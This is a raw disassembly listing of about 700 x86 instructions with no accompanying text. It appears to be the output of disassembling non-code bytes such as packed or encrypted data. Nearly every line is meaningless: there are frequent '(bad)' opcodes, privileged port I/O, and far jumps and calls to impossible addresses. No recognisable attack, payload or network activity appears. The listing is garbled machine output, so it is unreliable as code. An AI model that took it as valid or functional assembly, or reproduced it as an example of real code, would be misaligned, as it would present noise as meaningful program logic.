  42253c:	in     eax,0xaf
  42253e:	mov    bh,0xbc
  422540:	out    dx,al
  422541:	shl    DWORD PTR [edx-0xe203228],0xbd
  422548:	mov    esi,0xd1bad4c9
  42254d:	cld    
  42254e:	std    
  42254f:	mov    eax,0xe0e9eac3
  422555:	shl    cl,0x2
  422558:	in     al,0x12
  42255a:	loope  0x422522
  42255c:	lods   eax,DWORD PTR ds:[esi]
  42255d:	lods   al,BYTE PTR ds:[esi]
  42255e:	shr    bl,cl
  422560:	jecxz  0x422535
  422562:	call   0xf127f757
  422567:	aam    0xd0
  422569:	into   
  42256a:	mov    edi,0xbcd7e3d2
  42256f:	in     eax,dx
  422570:	pop    es
  422571:	aam    0xfe
  422573:	loop   0x42255f
  422575:	xlat   BYTE PTR ds:[ebx]
  422576:	test   bl,0xe0
  422579:	call   0xcef1d183
  42257e:	enter  0xe1e2,0xd1
  422582:	stc    
  422583:	out    dx,eax
  422584:	shl    DWORD PTR [ebp-0x15411116],1
  42258a:	mov    esi,0xcebdd3da
  42258f:	add    dh,al
  422591:	rcr    ch,cl
  422593:	ffreep st(4)
  422595:	loop   0x422597
  422597:	loop   0x42255f
  422599:	out    0xfa,al
  42259b:	test   eax,0xb6c2a5cb
  4225a0:	out    dx,al
  4225a1:	shl    BYTE PTR [eax-0x17453b30],1
  4225a7:	clc    
  4225a8:	stc    
  4225a9:	jmp    0xcf16e38d
  4225ae:	std    
  4225af:	add    al,0xf8
  4225b1:	fdivr  st(2),st
  4225b3:	lds    eax,FWORD PTR [edi]
  4225b5:	fsubp  st(2),st
  4225b7:	fadd   QWORD PTR [eax]
  4225b9:	enter  0xd307,0xbe
  4225bd:	(bad)  
  4225be:	icebp  
  4225bf:	loopne 0x422584
  4225c1:	leave  
  4225c2:	mov    edx,0xd3e8ecb7
  4225c7:	fxtract 
  4225c9:	jmp    0x4225bc
  4225cb:	mov    bh,0xc0
  4225cd:	rcr    ebx,0x1
  4225d0:	mov    BYTE PTR [edx+ebp*8],0xf6
  4225d4:	enter  0xddf,0xcf
  4225d8:	(bad)  
  4225d9:	out    dx,al
  4225da:	adc    ebp,DWORD PTR [eax-0x540a1b3b]
  4225e0:	jmp    0xefd9:0xeef9efc1
  4225e7:	fdivr  st(3),st
  4225e9:	int    0xc9
  4225eb:	sti    
  4225ec:	std    
  4225ed:	cli    
  4225ee:	mov    eax,0xd9c7ec01
  4225f3:	add    al,0xc1
  4225f5:	fdivr  DWORD PTR [esp+eiz*8-0xcf31827]
  4225fc:	out    0xde,al
  4225fe:	imul   bl
  422600:	rcr    edx,0xc6
  422603:	shl    al,1
  422605:	aad    0xc4
  422607:	int3   
  422608:	aam    0xf5
  42260a:	in     al,dx
  42260b:	loope  0x422606
  42260d:	shr    esi,cl
  42260f:	ret    0xd8fc
  422612:	(bad)  
  422613:	aad    0xe9
  422615:	sti    
  422616:	retf   
  422617:	fucomi st,st(6)
  422619:	iret   
  42261a:	int    0xbe
  42261c:	in     eax,dx
  42261d:	imul   al
  42261f:	out    dx,al
  422620:	rol    ecx,1
  422622:	cmc    
  422623:	mov    ecx,0xbfecfbc6
  422628:	leave  
  422629:	out    dx,eax
  42262a:	mov    eax,0xf4d8c3fe
  42262f:	add    bh,ch
  422631:	fld    st(2)
  422633:	shr    edi,0xe1
  422636:	add    ebx,ebx
  422638:	lds    eax,FWORD PTR ds:0xc9e4b9e0
  42263e:	mov    esi,0xdbbbefd5
  422643:	jmp    0xd520171a
  422648:	test   BYTE PTR [ebx],0xfc
  42264b:	fdivr  QWORD PTR [edx-0xe2f4714]
  422651:	(bad)  
  422653:	jmp    0xcecf:0xdddae605
  42265a:	fst    st(2)
  42265c:	mov    eax,0xe7ced2bf
  422661:	ror    esi,0xc0
  422664:	mov    bh,0xb7
  422666:	lock (bad) 
  422668:	stc    
  422669:	iret   
  42266a:	int    0xfd
  42266c:	loope  0x42263e
  42266e:	lock loope 0x422636
  422671:	add    eax,0xd50202e3
  422676:	loope  0x422643
  422678:	add    al,0xc8
  42267a:	call   0xa9161658
  42267f:	hlt    
  422680:	xlat   BYTE PTR ds:[ebx]
  422681:	(bad)  
  422682:	int3   
  422683:	idiv   BYTE PTR [eax-0xf4a0021]
  422689:	fcmovnu st,st(7)
  42268b:	loopne 0x42267d
  42268d:	mov    esi,0xf9df07df
  422692:	(bad)  
  422693:	fimul  WORD PTR [edi]
  422695:	clc    
  422696:	les    ecx,FWORD PTR [esi]
  422698:	(bad)  
  422699:	fild   WORD PTR [ebx]
  42269b:	iret   
  42269c:	mov    al,0xc0
  42269e:	mov    al,0xe6
  4226a0:	retf   
  4226a1:	repz repnz mov ebx,0xd7f3b1cd
  4226a8:	mov    dh,0xd3
  4226aa:	cld    
  4226ab:	add    edi,esp
  4226ad:	add    edi,ebx
  4226af:	loop   0x42268f
  4226b1:	cmc    
  4226b2:	mov    eax,0xc70ec8eb
  4226b7:	inc    DWORD PTR [esi]
  4226b9:	in     eax,dx
  4226ba:	into   
  4226bb:	ret    0xd6aa
  4226be:	mov    bl,0xae
  4226c0:	mov    bh,0xe4
  4226c2:	loope  0x422679
  4226c4:	mov    cl,0xe8
  4226c6:	mov    ch,0xc9
  4226c8:	leave  
  4226c9:	into   
  4226ca:	fdiv   st(3),st
  4226cc:	repnz cld 
  4226ce:	mul    dl
  4226d0:	add    cl,BYTE PTR [ebx]
  4226d2:	fcomi  st,st(0)
  4226d4:	(bad)  
  4226d5:	cmc    
  4226d6:	(bad)  
  4226d7:	cmc    
  4226d8:	iret   
  4226d9:	retf   0xb3d8
  4226dc:	enter  0xa8ed,0xd6
  4226e0:	mov    al,0xbb
  4226e2:	shl    DWORD PTR [ecx+ebp*8-0x2c454811],1
  4226e9:	fdivrp st(1),st
  4226eb:	loope  0x4226d5
  4226ed:	mov    ecx,0xd0d7d0be
  4226f2:	(bad)  
  4226f3:	loop   0x4226d9
  4226f5:	retf   
  4226f6:	(bad)  
  4226f8:	loope  0x4226c8
  4226fa:	shr    esp,cl
  4226fc:	in     al,0xd1
  4226fe:	retf   0xe5b5
  422701:	int    0xc5
  422703:	in     al,0xcf
  422705:	mov    dh,0xb5
  422707:	mov    ebx,0xd0cff0f4
  42270c:	dec    edi
  42270e:	mov    ebp,0xfefebdf3
  422713:	(bad)  
  422715:	stc    
  422716:	fld    DWORD PTR [eax]
  422718:	ret    0xd903
  42271b:	mov    edi,0xd2decaef
  422720:	idiv   ebx
  422722:	jmp    0x4226ea
  422724:	out    dx,al
  422725:	shl    bl,cl
  422727:	(bad)  
  422728:	cli    
  422729:	mov    ebp,0x2f5dd01
  42272e:	shl    ecx,0xfa
  422731:	hlt    
  422732:	std    
  422733:	(bad)  
  422734:	sti    
  422735:	retf   0xf4da
  422738:	jmp    0xca350401
  42273d:	fadd   st(5),st
  42273f:	cmc    
  422740:	loop   0x42272f
  422742:	int    0xd6
  422744:	lds    edi,FWORD PTR [edx-0x40450835]
  42274a:	leave  
  42274b:	mov    eax,0xd5d6c2d5
  422750:	in     al,0xc3
  422752:	loopne 0x42275d
  422754:	clc    
  422755:	push   cs
  422756:	add    al,0xe9
  422758:	vpsubd ymm1,ymm6,ymm4
  42275c:	int3   
  42275d:	lock shr bh,cl
  422760:	stos   BYTE PTR es:[edi],al
  422761:	(bad)  
  422762:	(bad)  
  422763:	loope  0x422744
  422765:	cmc    
  422766:	in     al,dx
  422767:	fcmovbe st,st(4)
  422769:	jmp    0xd303:0xe7fefafb
  422770:	loope  0x422764
  422772:	(bad)  
  422773:	faddp  st(2),st
  422775:	hlt    
  422776:	fxch   st(6)
  422778:	add    bl,cl
  42277a:	jmp    0xf5c7:0xbcbcddea
  422781:	mov    cl,0xc5
  422783:	retf   
  422784:	mov    dh,0xcd
  422786:	div    BYTE PTR [ebx-0xc433306]
  42278c:	(bad)  
  42278e:	repnz mov ebx,0xdfd5d3fb
  422794:	add    edx,esp
  422796:	mul    dl
  422798:	or     eax,0xadadc9d8
  42279d:	test   al,0xf2
  42279f:	loopne 0x422789
  4227a1:	loope  0x422773
  4227a3:	lock out dx,eax
  4227a5:	int3   
  4227a6:	mov    ebx,0xe2d6c4e5
  4227ab:	repnz mov ebp,0x7dd06c7
  4227b1:	pop    es
  4227b2:	loope  0x42278b
  4227b4:	fdivr  st,st(1)
  4227b6:	faddp  st(7),st
  4227b8:	fadd   st(4),st
  4227ba:	out    0xae,al
  4227bc:	(bad)  
  4227bd:	fbstp  TBYTE PTR [ecx-0x4f123e0f]
  4227c3:	aam    0xcf
  4227c5:	fidiv  WORD PTR [edi-0x251d2f2c]
  4227cb:	add    esp,ebx
  4227cd:	fsubrp st(0),st
  4227cf:	loop   0x4227ce
  4227d1:	mov    esp,0xc507ea03
  4227d6:	(bad)  
  4227d7:	hlt    
  4227d8:	in     al,0x9
  4227da:	add    dh,cl
  4227dc:	stos   BYTE PTR es:[edi],al
  4227dd:	loope  0x4227d6
  4227df:	in     eax,dx
  4227e0:	(bad)  
  4227e1:	lods   eax,DWORD PTR ds:[esi]
  4227e2:	ret    0xf6af
  4227e5:	in     eax,dx
  4227e6:	hlt    
  4227e7:	jmp    0x4227d2
  4227e9:	lock ret 0xbad2
  4227ed:	sar    ah,1
  4227ef:	(bad)  
  4227f0:	cmc    
  4227f1:	stc    
  4227f2:	fld    DWORD PTR [esi]
  4227f4:	push   es
  4227f5:	hlt    
  4227f6:	jmp    0xa9ee:0xebe0fdc6
  4227fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fe:	mov    al,0xf4
  422800:	lods   eax,DWORD PTR ds:[esi]
  422801:	ror    ebp,0xc1
  422804:	neg    esi
  422806:	mov    al,0xf6
  422808:	mov    ah,0xe2
  42280a:	(bad)  
  42280c:	mov    eax,0xc3dbe0f0
  422811:	(bad)  
  422813:	stc    
  422814:	std    
  422815:	jmp    0x8432216
  42281a:	repnz loope 0x422804
  42281d:	call   0xf704180b
  422822:	fcomi  st,st(7)
  422824:	shr    ah,cl
  422826:	aam    0xd1
  422828:	(bad)  
  422829:	aam    0xe3
  42282b:	cmc    
  42282c:	mov    eax,0xe3e7d5f9
  422831:	fidivr WORD PTR [eax+0xfc4e9e4]
  422837:	pop    es
  422838:	cli    
  422839:	retf   
  42283a:	enter  0xe2e7,0xc8
  42283e:	test   al,0xf7
  422840:	mov    cl,0xc7
  422842:	mov    dl,0xb0
  422844:	(bad)  
  422845:	sar    cl,1
  422847:	std    
  422848:	mov    esp,0xbdf3e1d5
  42284d:	clc    
  42284e:	sar    BYTE PTR [esp+edx*8-0x10403a19],1
  422855:	jmp    0x422826
  422857:	fiadd  WORD PTR [ebx]
  422859:	leave  
  42285a:	out    dx,eax
  42285b:	stos   DWORD PTR es:[edi],eax
  42285c:	jecxz  0x42282b
  42285e:	in     eax,0xad
  422860:	mov    dh,0xb2
  422862:	icebp  
  422863:	fcmove st,st(5)
  422865:	int    0xdd
  422867:	fcmove st,st(0)
  422869:	cmc    
  42286a:	cld    
  42286b:	cmc    
  42286c:	out    0xe0,eax
  42286e:	mul    esi
  422870:	(bad)  
  422871:	hlt    
  422872:	lock mov esp,0x3ebf406
  422879:	out    0xed,al
  42287b:	out    dx,eax
  42287c:	scas   al,BYTE PTR es:[edi]
  42287d:	ret    
  42287e:	xlat   BYTE PTR ds:[ebx]
  42287f:	repz out 0xf2,al
  422882:	test   al,0xb4
  422884:	mov    edx,0xd0b5e4c4
  422889:	rcl    ah,1
  42288b:	div    esi
  42288d:	cli    
  42288e:	fadd   QWORD PTR [ebx]
  422890:	in     al,dx
  422891:	repz aad 0xea
  422894:	aad    0xcb
  422896:	idiv   cl
  422898:	pop    es
  422899:	jmp    0x42289d
  42289b:	shl    al,cl
  42289d:	xlat   BYTE PTR ds:[ebx]
  42289e:	shr    edi,1
  4228a0:	jmp    0xd1ca:0xf1ecfbe5
  4228a7:	jmp    0xce19da8a
  4228ac:	icebp  
  4228ad:	(bad)  
  4228af:	not    ebp
  4228b1:	mul    eax
  4228b3:	jecxz  0x4228bb
  4228b5:	add    eax,DWORD PTR [esp+eiz*8]
  4228b8:	clc    
  4228b9:	int3   
  4228ba:	loopne 0x42289c
  4228bc:	ror    cl,0xe7
  4228bf:	fsubr  QWORD PTR [edx-0x3027253a]
  4228c5:	repnz mov ch,0xb9
  4228c8:	faddp  st(3),st
  4228ca:	jmp    0xf2bf:0xbee3fbb9
  4228d1:	(bad)  
  4228d3:	loope  0x422899
  4228d5:	fcmovnu st,st(0)
  4228d7:	or     al,0xf8
  4228d9:	add    al,0xe9
  4228db:	jmp    0xe5b1:0xc8d5e1f1
  4228e2:	jmp    0x3ca:0xe4baebb5
  4228e9:	in     al,dx
  4228ea:	cld    
  4228eb:	jmp    0xd7281ee5
  4228f0:	add    eax,0xc9e8c3c5
  4228f5:	sti    
  4228f6:	vmovlps QWORD PTR [eax],xmm0
  4228fa:	(bad)  
  4228fb:	(bad)  
  4228fd:	into   
  4228fe:	lock jecxz 0x4228c7
  422901:	(bad)  
  422902:	in     eax,dx
  422903:	xlat   BYTE PTR ds:[ebx]
  422904:	leave  
  422905:	out    0xe9,al
  422907:	mov    dh,0xbe
  422909:	loop   0x4228dc
  42290b:	mov    edi,0xdfc1dcff
  422910:	rcl    ebp,cl
  422912:	jmp    0xd801:0xebc9fdfa
  422919:	pop    es
  42291a:	int    0xad
  42291c:	loop   0x4228d5
  42291e:	in     al,0xac
  422920:	lods   eax,DWORD PTR ds:[esi]
  422921:	jmp    0x42290b
  422923:	sar    cl,cl
  422925:	not    ebp
  422927:	shl    cl,cl
  422929:	add    edi,esi
  42292b:	rcr    bh,1
  42292d:	shl    edi,1
  42292f:	loopne 0x422931
  422931:	hlt    
  422932:	hlt    
  422933:	in     eax,0xf8
  422935:	loope  0x422932
  422937:	pmaxub mm3,mm2
  42293a:	jmp    0xe8d4:0xb6a8d1aa
  422941:	icebp  
  422942:	xlat   BYTE PTR ds:[ebx]
  422943:	repz sti 
  422945:	int    0xfb
  422947:	fdivp  st(6),st
  422949:	mov    cl,0xf2
  42294b:	out    dx,eax
  42294c:	out    dx,al
  42294d:	aad    0x2
  42294f:	cld    
  422950:	stc    
  422951:	in     eax,0xc7
  422953:	clc    
  422954:	fsub   st,st(0)
  422956:	std    
  422957:	cld    
  422958:	cli    
  422959:	fsubr  st,st(1)
  42295b:	mov    al,0xf1
  42295e:	mov    cl,0xf4
  422960:	ret    0xbad3
  422963:	sti    
  422964:	int3   
  422965:	mov    edi,0xcafdf4d3
  42296a:	fnstsw WORD PTR [ebx-0x40030e0b]
  422970:	out    0xcb,al
  422972:	std    
  422973:	out    0xc5,al
  422975:	retf   0xedc6
  422978:	push   es
  422979:	jmp    0xacb3:0xcccdc909
  422980:	mov    esp,0xcbc5f2c0
  422985:	shl    al,1
  422987:	in     al,dx
  422988:	add    ecx,eax
  42298a:	jmp    0x5:0xbef4bac2
  422991:	fcomi  st,st(5)
  422993:	call   0xd4ff059f
  422998:	in     al,dx
  422999:	fimul  DWORD PTR [ecx]
  42299b:	jecxz  0x422968
  42299d:	lods   al,BYTE PTR ds:[esi]
  42299e:	loopne 0x422955
  4229a0:	lods   al,BYTE PTR ds:[esi]
  4229a1:	(bad)  
  4229a2:	enter  0xe9d3,0xda
  4229a6:	mov    ch,0xd7
  4229a8:	retf   
  4229a9:	mov    cl,0xf9
  4229ab:	add    bh,BYTE PTR [ebp-0x3c132e28]
  4229b1:	add    al,bl
  4229b3:	(bad)  
  4229b4:	(bad)  
  4229b5:	std    
  4229b6:	or     eax,0x130cf9ce
  4229bb:	loopne 0x422988
  4229bd:	lods   al,BYTE PTR ds:[esi]
  4229be:	scas   eax,DWORD PTR es:[edi]
  4229bf:	mov    cl,0xef
  4229c1:	mul    eax
  4229c3:	(bad)  [ebp-0x2e2f4529]
  4229c9:	clc    
  4229ca:	(bad)  
  4229cc:	mov    edx,0xe7ddf1be
  4229d1:	icebp  
  4229d2:	xlat   BYTE PTR ds:[ebx]
  4229d3:	call   0xf84e1edb
  4229d8:	loope  0x4229df
  4229da:	or     ecx,ebx
  4229dc:	icebp  
  4229dd:	fsubrp st(6),st
  4229df:	ret    
  4229e0:	out    dx,eax
  4229e1:	(bad)  
  4229e2:	lods   al,BYTE PTR ds:[esi]
  4229e3:	fcmove st,st(7)
  4229e5:	mov    ecx,0xe2d1cede
  4229ea:	fdivr  st,st(0)
  4229ec:	stc    
  4229ed:	stc    
  4229ee:	int    0xfa
  4229f0:	in     al,dx
  4229f1:	fstp   st(2)
  4229f3:	cld    
  4229f4:	or     dh,bh
  4229f6:	out    0xdf,eax
  4229f8:	loop   0x422a09
  4229fa:	push   cs
  4229fb:	enter  0xd2e6,0xe9
  4229ff:	in     eax,dx
  422a00:	mov    al,0xe2
  422a02:	mov    al,0xf8
  422a04:	ror    bl,0xd3
  422a07:	mov    dh,0xde
  422a09:	int    0xba
  422a0b:	add    al,al
  422a0d:	jecxz  0x4229db
  422a0f:	(bad)  
  422a10:	jmp    0x422a14
  422a12:	rcr    cl,1
  422a14:	(bad)  
  422a15:	sti    
  422a16:	clc    
  422a17:	retf   
  422a18:	in     al,0xd9
  422a1a:	add    eax,0xeea8eba7
  422a1f:	jmp    0xed3420f9
  422a24:	(bad)  
  422a25:	stc    
  422a26:	enter  0xbdb5,0xd4
  422a2a:	enter  0xf2c2,0xec
  422a2e:	jecxz  0x4229f2
  422a30:	add    esi,edi
  422a32:	(bad)  
  422a33:	jecxz  0x4229f3
  422a35:	retf   
  422a36:	cli    
  422a37:	fstp   st(4)
  422a39:	int3   
  422a3a:	in     al,0xdc
  422a3c:	out    dx,al
  422a3d:	jmp    0xc9ed:0xf6f5f2ed
  422a44:	leave  
  422a45:	xlat   BYTE PTR ds:[ebx]
  422a46:	mov    eax,0xe1fcd9b4
  422a4b:	cli    
  422a4c:	stc    
  422a4d:	into   
  422a4e:	push   es
  422a4f:	loope  0x422a3d
  422a51:	fcomi  st,st(0)
  422a53:	(bad)  
  422a55:	xlat   BYTE PTR ds:[ebx]
  422a56:	in     al,0xea
  422a58:	sti    
  422a59:	jmp    0x422a38
  422a5b:	lds    esi,FWORD PTR [edx-0x2e28510d]
  422a61:	(bad)  
  422a62:	iret   
  422a63:	(bad)  
  422a64:	in     al,0xb0
  422a66:	out    0xca,al
  422a68:	test   DWORD PTR [ebx],0x3bef0f3
  422a6e:	(bad)  
  422a6f:	mov    esp,0x2e7fdbe
  422a74:	(bad)  
  422a76:	add    ebx,eax
  422a78:	jmp    0xd22c3387
  422a7d:	rol    ecx,cl
  422a7f:	mov    al,0xac
  422a81:	mov    bl,0xd6
  422a83:	int3   
  422a84:	in     al,0xad
  422a86:	leave  
  422a87:	cmc    
  422a88:	xlat   BYTE PTR ds:[ebx]
  422a89:	fld    QWORD PTR [ebx]
  422a8b:	sti    
  422a8c:	mov    eax,0xfbffc3d4
  422a91:	fisttp QWORD PTR [ecx]
  422a93:	(bad)  
  422a95:	ftst   
  422a97:	or     ah,ah
  422a99:	retf   
  422a9a:	stc    
  422a9b:	out    0xf2,eax
  422a9d:	in     eax,dx
  422a9e:	(bad)
  422aa1:	mov    dh,0xc8
  422aa3:	mov    edi,0xdcfacdca
  422aa9:	mov    ch,0xf2
  422aab:	add    edi,DWORD PTR [edi-0x2c07210e]
  422ab1:	fst    st(2)
  422ab3:	or     DWORD PTR [ecx],ecx
  422ab5:	rcl    dh,0xe5
  422ab8:	jmp    0xd6b1:0xeaced9d3
  422abf:	shl    DWORD PTR [esi-0x82e193c],0xfb
  422ac6:	out    dx,al
  422ac7:	in     al,dx
  422ac8:	sar    ecx,cl
  422aca:	out    dx,eax
  422acb:	cld    
  422acc:	aam    0xbc
  422ace:	mov    esi,0xf2fcd7da
  422ad3:	shl    esp,0xe0
  422ad6:	in     al,0xed
  422ad8:	add    al,0xd8
  422ada:	dec    bl
  422adc:	out    dx,eax
  422add:	leave  
  422ade:	jecxz  0x422abc
  422ae0:	sar    ebx,cl
  422ae2:	xlat   BYTE PTR ds:[ebx]
  422ae3:	out    0xe5,eax
  422ae5:	(bad)  
  422ae6:	lods   al,BYTE PTR ds:[esi]
  422ae7:	lock cli 
  422ae9:	loop   0x422abd
  422aeb:	(bad)  
  422aec:	call   0xd91802bd
  422af1:	(bad)  
  422af3:	in     al,0xe5
  422af5:	(bad)  
  422af7:	in     al,dx
  422af8:	out    0x8,al
  422afa:	pop    es
  422afb:	(bad)  
  422afd:	(bad)  
  422afe:	test   al,0xc6
  422b00:	shl    ebx,0xcb
  422b03:	int3   
  422b04:	sar    bl,0xfd
  422b07:	ror    dl,cl
  422b09:	mov    eax,0xc2f8f5d3
  422b0e:	call   eax
  422b10:	in     eax,0xd0
  422b12:	(bad)  
  422b13:	call   0xfb0b2a00
  422b18:	call   0xf20e2df5
  422b1d:	icebp  
  422b1e:	loope  0x422af2
  422b20:	xlat   BYTE PTR ds:[ebx]
  422b21:	xlat   BYTE PTR ds:[ebx]
  422b22:	lock (bad) 
  422b24:	mov    bh,0xcc
  422b26:	rcr    bl,cl
  422b28:	test   esp,0xd707c8dd
  422b2e:	shl    dl,0xd2
  422b31:	icebp  
  422b32:	aad    0x7
  422b34:	fmul   st,st(1)
  422b36:	in     eax,0xd9
  422b38:	dec    DWORD PTR [edx]
  422b3a:	in     eax,0xcb
  422b3c:	ror    bh,cl
  422b3e:	leave  
  422b3f:	jmp    0x422b14
  422b41:	(bad)  
  422b42:	(bad)  
  422b44:	loopne 0x422afc
  422b46:	fidivr DWORD PTR [edx-0x4200e0f]
  422b4c:	test   eax,0xe2ddddf8
  422b52:	jmp    0xec05:0xe7e803e6
  422b59:	out    dx,al
  422b5a:	or     al,0xef
  422b5c:	fsubrp st(7),st
  422b5e:	ret    
  422b5f:	mov    ebp,0xecf4c8d1
  422b64:	out    dx,al
  422b65:	mov    bh,0xcd
  422b67:	mov    ecx,0xf8fcfae4
  422b6c:	(bad)  
  422b6e:	add    edi,DWORD PTR [ebx-0xe47143d]
  422b74:	ret    0xd4f5
  422b77:	loopne 0x422b61
  422b79:	fsubp  st(0),st
  422b7b:	out    dx,al
  422b7c:	loope  0x422b4b
  422b7e:	sar    BYTE PTR [esi+eiz*8-0x330c4f17],0xe7
  422b86:	mov    eax,0xf8f4c8f4
  422b8b:	aam    0xb9
  422b8d:	in     al,dx
  422b8e:	icebp  
  422b8f:	test   DWORD PTR [esi],0xd9d7c6c3
  422b95:	add    ebp,edx
  422b97:	iret   
  422b98:	fadd   QWORD PTR [eax+ebp*8]
  422b9b:	out    dx,eax
  422b9c:	leave  
  422b9d:	repnz mov dl,0xb1
  422ba0:	mov    ch,0xe8
  422ba2:	lock aam 0xf9
  422ba5:	(bad)  
  422ba7:	in     eax,dx
  422ba8:	out    dx,al
  422ba9:	jmp    0xfed1:0xfddebbbc
  422bb0:	shl    ebp,0xde
  422bb3:	inc    ch
  422bb5:	fnstcw WORD PTR [ebp+eiz*8-0x26ff3303]
  422bbc:	shl    dl,0xc1
  422bbf:	hlt    
  422bc0:	out    0xcd,al
  422bc2:	into   
  422bc3:	shl    esp,1
  422bc5:	retf   0xb4fb
  422bc8:	int3   
  422bc9:	in     al,dx
  422bca:	inc    BYTE PTR [edx]
  422bcc:	ret    0xfcee
  422bcf:	dec    ah
  422bd1:	repnz fsubp st(0),st
  422bd4:	rol    ch,0xd4
  422bd7:	loopne 0x422bdd
  422bd9:	in     al,0xe4
  422bdb:	mov    esp,0xd1e6afdd
  422be0:	mov    esp,0xf6d4b3bb
  422be5:	mov    edx,0xd3eebfee
  422bea:	rcl    bh,1
  422bec:	std    
  422bed:	into   
  422bee:	rcr    ah,cl
  422bf0:	xlat   BYTE PTR ds:[ebx]
  422bf1:	hlt    
  422bf2:	pop    es
  422bf3:	or     ebx,ecx
  422bf5:	in     eax,0xe5
  422bf7:	hlt    
  422bf8:	sti    
  422bf9:	int3   
  422bfa:	(bad)  
  422bfc:	int3   
  422bfd:	mov    bl,0xed
  422bff:	imul   cl
  422c01:	not    bh
  422c03:	mov    dl,0xd9
  422c05:	retf   
  422c06:	lock std 
  422c08:	mov    edx,0xd6f6d7ca
  422c0d:	int3   
  422c0e:	mov    esp,0xdedfc2c6
  422c13:	cld    
  422c14:	fsubr  st(2),st
  422c16:	fdivr  st,st(7)
  422c18:	or     ch,bl
  422c1a:	(bad)  
  422c1c:	mov    edi,0xefcab2c7
  422c21:	out    0xca,al
  422c23:	retf   0xe9b4
  422c26:	(bad)  
  422c27:	(bad)  
  422c29:	(bad)  
  422c2b:	int    0xdb
  422c2d:	xlat   BYTE PTR ds:[ebx]
  422c2e:	cld    
  422c2f:	lock rcr ah,0xdc
  422c33:	mov    edi,0xfbc7e903
  422c38:	out    dx,al
  422c39:	fld    DWORD PTR [ebx]
  422c3b:	mov    edi,0xe4d0b7cd
  422c40:	loop   0x422beb
  422c42:	test   al,0xd4
  422c44:	mov    edx,0xb5b6e4c5
  422c49:	lock iret 
  422c4b:	(bad)  
  422c4d:	cld    
  422c4e:	mov    ebp,0xdfc3e6be
  422c53:	test   BYTE PTR [edx],0xc4
  422c56:	fstp   st(6)
  422c58:	jmp    0x422c29
  422c5a:	(bad)  
  422c5c:	leave  
  422c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c5e:	jmp    0x422c26
  422c60:	cmc    
  422c61:	jecxz  0x422c27
  422c63:	leave  
  422c64:	mov    dl,0xf9
  422c66:	in     eax,0xd0
  422c68:	stc    
  422c69:	jmp    0xc5c3:0x2b7fb
  422c70:	(bad)  
  422c71:	jmp    0x422c74
  422c73:	test   BYTE PTR [edi],0xeb
  422c76:	cli    
  422c77:	or     al,BYTE PTR [ecx+edi*8]
  422c7a:	or     ecx,ebp
  422c7c:	(bad)  
  422c7e:	loop   0x422c2b
  422c80:	out    dx,eax
  422c81:	xlat   BYTE PTR ds:[ebx]
  422c82:	leave  
  422c83:	retf   
  422c84:	iret   
  422c85:	lock cmc 
  422c87:	repnz int 0xda
  422c8a:	int3   
  422c8b:	mov    edx,0x5d5cef1
  422c90:	inc    BYTE PTR [edi]
  422c92:	sar    ah,cl
  422c94:	aad    0xda
  422c96:	call   0xca27fc74
  422c9b:	icebp  
  422c9c:	scas   al,BYTE PTR es:[edi]
  422c9d:	mov    edi,0xf6bce8b1
  422ca2:	cmc    
  422ca3:	call   0xd9f70394
  422ca8:	fcomi  st,st(6)
  422caa:	sti    
  422cab:	sar    esi,1
  422cad:	loop   0x422c6f
  422caf:	clc    
  422cb0:	mov    esp,0xfbd4f8d6
  422cb5:	loopne 0x422cb3
  422cb7:	in     al,0xcf
  422cb9:	enter  0xeef1,0xe4
  422cbd:	fbstp  TBYTE PTR [esi-0x30490d2f]
  422cc3:	leave  
  422cc4:	jmp    0xbabe:0xcbeae4c6
  422ccb:	cmc    
  422ccc:	aam    0xff
  422cce:	jecxz  0x422ca1
  422cd0:	or     eax,edi
  422cd2:	(bad)  
  422cd5:	mov    ebp,0xc508e8fa
  422cda:	rol    dl,0xf1
  422cdd:	(bad)  
  422cde:	jmp    0xd4e0:0xe6d4b3d3
  422ce5:	fcmovnu st,st(1)
  422ce7:	sti    
  422ce8:	(bad)  
  422ce9:	(bad)  
  422ceb:	icebp  
  422cec:	(bad)  
  422ced:	fnstsw WORD PTR [ebp+0xebc5e7]
  422cf3:	call   0xd63704cf
  422cf8:	sti    
  422cf9:	retf   0xcbdf
  422cfc:	out    dx,al
  422cfd:	scas   al,BYTE PTR es:[edi]
  422cfe:	lock cmc 
  422d00:	mov    bh,0xe8
  422d02:	ror    ebx,1
  422d04:	in     eax,dx
  422d05:	enter  0xe4e6,0xf6
  422d09:	bnd ret 
  422d0b:	(bad)  
  422d0c:	stc    
  422d0d:	shl    edi,1
  422d0f:	in     al,0xdb
  422d11:	rcr    ah,1
  422d13:	ror    BYTE PTR [ebx],0xfe
  422d16:	jecxz  0x422cfb
  422d18:	call   0xad120100
  422d1d:	ret    0xd3b7
  422d20:	icebp  
  422d21:	out    0xfb,eax
  422d23:	icebp  
  422d24:	xlat   BYTE PTR ds:[ebx]
  422d25:	icebp  
  422d26:	mov    ecx,0xe1cbbab4
  422d2b:	mov    edx,0xe307fbff
  422d30:	std    
  422d31:	out    0xd5,eax
  422d33:	icebp  
  422d34:	loopne 0x422d1b
  422d36:	clc    
  422d37:	std    
  422d38:	hlt    
  422d39:	int3   
  422d3a:	adc    al,ch
  422d3c:	test   eax,0xd4cbd7de
  422d41:	test   eax,0xd5f0c4f7
  422d46:	imul   ecx
  422d48:	cmc    
  422d49:	aam    0xc8
  422d4b:	rcl    cl,cl
  422d4d:	fucomi st,st(6)
  422d4f:	not    al
  422d51:	loope  0x422d3d
  422d53:	fnstsw WORD PTR [esi+0x5cedfdc]
  422d59:	or     ch,ch
  422d5b:	shr    al,0xe3
  422d5e:	mov    ebp,0xfac9d5c9
  422d63:	loopne 0x422d29
  422d65:	mov    al,0xfa
  422d67:	aad    0xf9
  422d69:	mov    ah,0xf4
  422d6b:	int    0xcc
  422d6d:	fiadd  WORD PTR [ecx]
  422d6f:	out    0xc1,eax
  422d71:	call   eax
  422d73:	fld    DWORD PTR [ecx+ebp*8]
  422d76:	loopne 0x422d87
  422d78:	retf   
  422d79:	out    0x4,al
  422d7b:	fdivr  QWORD PTR [edi-0x53320853]
  422d81:	sti    
  422d82:	aam    0xcf
  422d84:	rcr    edx,1
  422d86:	(bad)  
  422d87:	retf   
  422d88:	(bad)  
  422d8a:	sti    
  422d8b:	cmc    
  422d8c:	(bad)  
  422d8d:	sti    
  422d8e:	(bad)  
  422d8f:	mov    esi,0x3c5d406
  422d94:	(bad)  
  422d95:	xlat   BYTE PTR ds:[ebx]
  422d96:	sti    
  422d97:	leave  
  422d98:	fsubr  st(2),st
